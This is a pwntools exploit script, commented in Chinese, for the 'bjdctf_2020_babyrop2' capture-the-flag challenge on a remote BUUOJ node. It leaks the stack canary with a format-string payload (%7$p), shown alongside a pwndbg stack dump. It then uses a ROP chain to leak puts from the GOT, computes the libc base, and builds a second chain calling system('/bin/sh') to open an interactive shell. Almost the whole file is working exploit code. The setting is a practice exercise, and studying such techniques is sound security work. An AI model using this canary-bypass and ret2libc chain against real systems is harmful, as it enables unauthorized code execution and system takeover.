from pwn import *
context.log_level = 'debug'

# 使用leak泄漏canary地址来绕过
'''
Can u return to libc ?
Try u best!
I'll give u some gift to help u!
aa%6$p
aa0x702436256161
Pull up your sword and tell me u story!
'''
# 经过调试在第六个位置输出来0x6161，即aa得值，说明printf泄漏的地址会从第七个位置开始泄漏
'''
找个nop指令，给程序下个断点，看一下程序里栈的情况
pwndbg> stack 30
00:0000│ rsp 0x7fffffffde48 —▸ 0x7ffff7eb9ea6 (read+22) ◂— add rsp, 0x18
01:0008│-040 0x7fffffffde50 ◂— 0x0
02:0010│-038 0x7fffffffde58 —▸ 0x7ffff7ffe310 ◂— 0x0
03:0018│-030 0x7fffffffde60 ◂— 0x3
04:0020│-028 0x7fffffffde68 —▸ 0x4008c3 (vuln+60) ◂— nop 
05:0028│ rsi 0x7fffffffde70 —▸ 0x7ffff7ffd00a (_rtld_global+10) ◂— 0xe608000000000000
06:0030│-018 0x7fffffffde78 —▸ 0x400870 (gift+92) ◂— nop 
07:0038│-010 0x7fffffffde80 ◂— 0x702437256161 /* 'aa%7$p' */
08:0040│-008 0x7fffffffde88 ◂— 0x49caf7dca39c2000
09:0048│ rbp 0x7fffffffde90 —▸ 0x7fffffffdeb0 ◂— 0x1
0a:0050│+008 0x7fffffffde98 —▸ 0x40090f (main+53) ◂— mov eax, 0
0b:0058│+010 0x7fffffffdea0 ◂— 0x0

canary的地址一般是位于 rbp-8 的位置，即为0x7fffffffde88地址的地方，泄漏的值为：0x49caf7dca39c2000
'''

r = remote('node5.buuoj.cn', 29302)
# r = process(r'./bjdctf_2020_babyrop2')
elf = ELF(r'../../pwn_file/bjdctf_2020_babyrop2')
libc = ELF(r'../libc/libc6_2.23-0ubuntu11_amd64.so')

leak_payload = b'%7$p'
r.sendlineafter(b'help u!', leak_payload)
r.recvline()
canary_addr = int(r.recvuntil(b'\n', drop=True), 16)
print(hex(canary_addr))

vul_addr = 0x400887
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400993
ret_addr = 0x4005f9

payload = b'A' * 0x18 + p64(canary_addr) + b'B' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vul_addr)
r.sendlineafter(b'u story!', payload)
r.recvline()
puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_addr: {hex(puts_addr)}")

base_addr = puts_addr - libc.sym['puts']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

payload2 = b'A' * 0x18 + p64(canary_addr) + b'B' * 8 + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
r.sendlineafter(b'u story!', payload2)
r.interactive()


